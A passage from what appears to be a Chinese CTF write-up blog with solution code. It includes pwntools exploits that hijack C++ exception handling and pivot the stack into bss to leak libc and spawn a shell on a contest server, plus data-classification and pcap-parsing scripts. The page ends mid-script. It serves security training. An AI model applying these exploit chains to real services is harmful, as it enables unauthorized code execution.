class="token string">            je $-2            ret        '''</span></span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'right'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time            li<span class="token punctuation">(</span><span class="token string">'time = '</span> <span class="token operator">+</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>start_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'char = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> j                <span class="token keyword">break</span>        li<span class="token punctuation">(</span><span class="token string">'flag = '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>li<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TimeLogger"><a href="#TimeLogger" class="headerlink" title="TimeLogger"></a>TimeLogger</h3><p>利用<code>C++</code>的异常处理机制，在抛出异常之后如果没有相应处理异常的部分就会回退到上层函数寻找异常处理，控制返回地址返回到后门函数中处理异常的部分，最终<code>system</code>的参数是<code>bss</code>段的<code>excType</code>，所以还需要通过<code>trace</code>功能溢出改<code>excType</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.155.126.78'</span><span class="token punctuation">,</span> <span class="token number">32596</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x401BC2</span>tmp <span class="token operator">=</span> <span class="token number">0x4040c0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'chocie'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'here'</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00/bin/sh\x00'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'records?'</span><span class="token punctuation">,</span> <span class="token string">b'y'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'chocie'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x78</span> <span class="token operator">/</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'message'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>栈迁移到<code>bss</code>段</p><pre class="line-numbers language-ptyhon" data-language="ptyhon"><code class="language-ptyhon">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;pwn1&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)#context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 1if debug:    r &#x3D; remote(&#39;139.155.126.78&#39;, 38948)else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)libc &#x3D; ELF(&#39;.&#x2F;2.35&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)def dbg():    gdb.attach(r)ret &#x3D; 0x4004f6bss &#x3D; 0x601a00start &#x3D; 0x400540puts_got &#x3D; elf.got[&#39;puts&#39;]puts_plt &#x3D; elf.plt[&#39;puts&#39;]leave_ret &#x3D; 0x00000000004006dbpop_rdi_ret &#x3D; 0x0000000000400773def write(rop, target):    p &#x3D; b&#39;a&#39; * 0x30 + p64(bss + 0x30) + p64(0x4006C4)    r.sendafter(b&#39;overflow&#39;, p)    p &#x3D; rop + p64(target) + p64(leave_ret)    r.send(p)p &#x3D; p64(puts_got) * 2 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)write(p, bss + 0x8)libc_base &#x3D; u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]pop_rsi_ret &#x3D; 0x000000000002be51 + libc_basepop_rdx_r12_ret &#x3D; 0x000000000011f2e7 + libc_baseone &#x3D; [0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]ogg &#x3D; libc_base + one[3]p &#x3D; p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_r12_ret) + p64(0) * 2 + p64(ogg)write(p, bss - 0x8)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据安全1"><a href="#数据安全1" class="headerlink" title="数据安全1"></a>数据安全1</h3><p>让<code>gpt</code>写个代码正则匹配一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> re<span class="token comment"># 读取CSV文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'person_data.csv'</span><span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 定义正则表达式</span>birthdate_pattern <span class="token operator">=</span> <span class="token string">r'^\d&#123;8&#125;$'</span>  <span class="token comment"># 出生日期是8位数字</span>id_number_pattern <span class="token operator">=</span> <span class="token string">r'^\d&#123;17&#125;[\dX]$'</span>  <span class="token comment"># 身份证号码是18位的纯数字或最后一位为X</span>phone_pattern <span class="token operator">=</span> <span class="token string">r'^\d&#123;11&#125;$'</span>  <span class="token comment"># 手机号码是11位数字</span>name_pattern <span class="token operator">=</span> <span class="token string">r'^[\u4e00-\u9fa5]&#123;2,4&#125;$'</span>  <span class="token comment"># 姓名是2-4位中文</span>gender_pattern <span class="token operator">=</span> <span class="token string">r'^男|女$'</span>  <span class="token comment"># 性别为男/女</span>id_pattern <span class="token operator">=</span> <span class="token string">r'^\d&#123;1,4&#125;$'</span>  <span class="token comment"># 编号为1-4位数字</span>password_hash_pattern <span class="token operator">=</span> <span class="token string">r'^[a-f0-9]&#123;32&#125;$'</span>  <span class="token comment"># 密码的hash是32位小写MD5值</span>username_pattern <span class="token operator">=</span> <span class="token string">r'^[a-zA-Z0-9]+$'</span>  <span class="token comment"># 用户名由数字字母组成</span><span class="token comment"># 定义识别函数</span><span class="token keyword">def</span> <span class="token function">identify_column</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>birthdate_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'出生日期'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>id_number_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'身份证号码'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>phone_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'手机号码'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>name_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'姓名'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>gender_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'性别'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>id_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'编号'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>password_hash_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'密码'</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>username_pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'用户名'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'未知'</span><span class="token comment"># 初始化分组数据</span>grouped_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>key<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'编号'</span><span class="token punctuation">,</span> <span class="token string">'用户名'</span><span class="token punctuation">,</span> <span class="token string">'密码'</span><span class="token punctuation">,</span> <span class="token string">'姓名'</span><span class="token punctuation">,</span> <span class="token string">'性别'</span><span class="token punctuation">,</span> <span class="token string">'出生日期'</span><span class="token punctuation">,</span> <span class="token string">'身份证号码'</span><span class="token punctuation">,</span> <span class="token string">'手机号码'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token comment"># 迭代每一行，识别并分组数据</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> row <span class="token keyword">in</span> df<span class="token punctuation">.</span>iterrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># 跳过第一行，因为它是列标题</span>        <span class="token keyword">continue</span>    identified_columns <span class="token operator">=</span> <span class="token punctuation">[</span>identify_column<span class="token punctuation">(</span>cell<span class="token punctuation">)</span> <span class="token keyword">for</span> cell <span class="token keyword">in</span> row<span class="token punctuation">]</span>    <span class="token keyword">for</span> col<span class="token punctuation">,</span> cell <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>identified_columns<span class="token punctuation">,</span> row<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> col <span class="token keyword">in</span> grouped_data<span class="token punctuation">:</span>            grouped_data<span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token comment"># 将分组后的数据转换为DataFrame</span>sorted_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>key<span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> grouped_data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 保存到新的CSV文件</span>sorted_df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'sorted_file.csv'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"列已重新排列并保存到 'sorted_file.csv'"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据安全2"><a href="#数据安全2" class="headerlink" title="数据安全2"></a>数据安全2</h3><p>还是问<code>gpt</code>，<code>tshark</code>提取<code>json</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> data.pcapng <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> http.request.method <span class="token parameter variable">-e</span> http.file_data <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再正则匹配</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 判断错误</span>usernamef  <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'^[a-zA-Z0-9]+$'</span><span class="token punctuation">)</span>namef <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'^[\u4e00-\u9fff]+$'</span><span class="token punctuation">)</span>sexf <span class="token operator">=</span>  re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'^(男|女)$'</span><span class="token punctuation">)</span>birthf <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d&#123;8&#125;'</span><span class="token punctuation">)</span>idcardf <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d&#123;17&#125;X|\d&#123;18&#125;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_check_digit</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 权重数组</span>    weights <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>    <span class="token comment"># 校验码数组</span>    check_digits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span>    <span class="token comment"># 将数字转换为字符串并提取每位数字</span>    number_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span>        actual_check_digit <span class="token operator">=</span> number_str<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment"># 计算加权和</span>    weighted_sum <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>digit<span class="token punctuation">)</span> <span class="token operator">*</span> weight <span class="token keyword">for</span> digit<span class="token punctuation">,</span> weight <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>number_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> weights<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 计算余数</span>    remainder <span class="token operator">=</span> weighted_sum <span class="token operator">%</span> <span class="token number">11</span>        <span class="token comment"># 获取校验码</span>    check_digit <span class="token operator">=</span> check_digits<span class="token punctuation">[</span>remainder<span class="token punctuation">]</span>        <span class="token keyword">return</span> check_digit <span class="token operator">==</span> actual_check_digit<span class="token comment"># 手机号</span>phonef <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d&#123;11&#125;'</span><span class="token punctuation">)</span>phon <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">734</span><span class="token punctuation">,</span> <span class="token number">735</span><span class="token punctuation">,</span> <span class="token number">736</span><span class="token punctuation">,</span> <span class="token number">737</span><span class="token punctuation">,</span> <span class="token number">738</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">,</span> <span class="token number">747</span><span class="token punctuation">,</span> <span class="token number">748</span><span class="token punctuation">,</span> <span class="token number">750</span><span class="token punctuation">,</span> <span class="token number">751</span><span class="token punctuation">,</span> <span class="token number">752</span><span class="token punctuation">,</span> <span class="token number">757</span><span class="token punctuation">,</span> <span class="token number">758</span><span class="token punctuation">,</span> <span class="token number">759</span><span class="token punctuation">,</span>         <span class="token number">772</span><span class="token punctuation">,</span> <span class="token number">778</span><span class="token punctuation">,</span> <span class="token number">782</span><span class="token punctuation">,</span> <span class="token number">783</span><span class="token punctuation">,</span> <span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">787</span><span class="token punctuation">,</span> <span class="token number">788</span><span class="token punctuation">,</span> <span class="token number">795</span><span class="token punctuation">,</span> <span class="token number">798</span><span class="token punctuation">,</span> <span class="token number">730</span><span class="token punctuation">,</span> <span class="token number">731</span><span class="token punctuation">,</span> <span class="token number">732</span><span class="token punctuation">,</span> <span class="token number">740</span><span class="token punctuation">,</span> <span class="token number">745</span><span class="token punctuation">,</span>         <span class="token number">746</span><span class="token punctuation">,</span> <span class="token number">755</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">766</span><span class="token punctuation">,</span> <span class="token number">767</span><span class="token punctuation">,</span> <span class="token number">771</span><span class="token punctuation">,</span> <span class="token number">775</span><span class="token punctuation">,</span> <span class="token number">776</span><span class="token punctuation">,</span> <span class="token number">785</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">796</span><span class="token punctuation">,</span> <span class="token number">733</span><span class="token punctuation">,</span> <span class="token number">749</span><span class="token punctuation">,</span> <span class="token number">753</span><span class="token punctuation">,</span>         <span class="token number">773</span><span class="token punctuation">,</span> <span class="token number">774</span><span class="token punctuation">,</span> <span class="token number">777</span><span class="token punctuation">,</span> <span class="token number">780</span><span class="token punctuation">,</span> <span class="token number">781</span><span class="token punctuation">,</span> <span class="token number">789</span><span class="token punctuation">,</span> <span class="token number">790</span><span class="token punctuation">,</span> <span class="token number">791</span><span class="token punctuation">,</span> <span class="token number">793</span><span class="token punctuation">,</span> <span class="token number">799</span><span class="token punctuation">]</span><span class="token comment"># 存储所有提取的数据</span>extracted_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>back_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 处理每一行</span><span class="token keyword">for</span> line <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token comment"># 去掉空白行和不包含 JSON 的行</span>    <span class="token keyword">if</span> <span class="token string">"POST"</span> <span class="token keyword">in</span> line <span class="token keyword">and</span> <span class="token string">'&#123;'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># 提取 JSON 部分并加载为字典</span>            <span class="token comment"># 分离POST方法和数据</span>            json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'POST\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            extracted_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>json_data<span class="token punctuation">)</span>        <span class="token keyword">except</span> json<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"无法解析行：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 打印或进一步处理提取的数据</span><span class="token keyword">for</span> data <span class="token keyword">in</span> extracted_data<span class="token punctuation">:</span>        username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    sex  <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sex"</span><span class="token punctuation">)</span>    birth <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"birth"</span><span class="token punctuation">)</span>    idcard  <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"idcard"</span><span class="token punctuation">)</span>    card_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idcard<span class="token punctuation">)</span>    second_last_digit <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>card_str<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> second_last_digit <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        sexs <span class="token operator">=</span> <span class="token string">'女'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sexs <span class="token operator">=</span> <span class="token string">'男'</span>    is_valid <span class="token operator">=</span> calculate_check_digit<span class="token punctuation">(</span>idcard<span class="token punctuation">)</span>    phone <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"phone"</span><span class="token punctuation">)</span>    phone_three <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span><span class="token punctuation">(</span>usernamef<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>namef<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>sexf<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>sex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>birthf<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>birth<span class="token 